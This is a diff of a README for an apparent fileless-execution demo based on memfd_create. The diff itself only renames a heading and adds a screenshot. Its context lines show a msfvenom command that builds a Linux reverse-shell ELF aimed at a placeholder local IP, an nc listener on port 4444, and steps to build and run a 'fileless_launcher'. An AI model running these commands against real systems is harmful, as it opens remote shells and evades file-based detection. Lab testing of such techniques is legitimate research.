@@ -24,7 +24,7 @@ Follow these steps to replicate the fileless execution sequence in a controlled 
 * Linux Kernel 4.18+ (with `CONFIG_BPF_SYSCALL` enabled)
 * Metasploit Framework (for test payload generation)
 
-### Step 1: Generate the Test Payload
+### Generate the Test Payload
 Generate a standard Linux x64 reverse shell ELF binary:
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_LOCAL_IP> LPORT=4444 -f elf > raw_shell.elf
@@ -39,3 +39,5 @@ nc -nvlp 4444
 go build -o fileless_launcher main.go
 ./fileless_launcher
 ```
+
+![Project Screenshot](memfd_create.png)
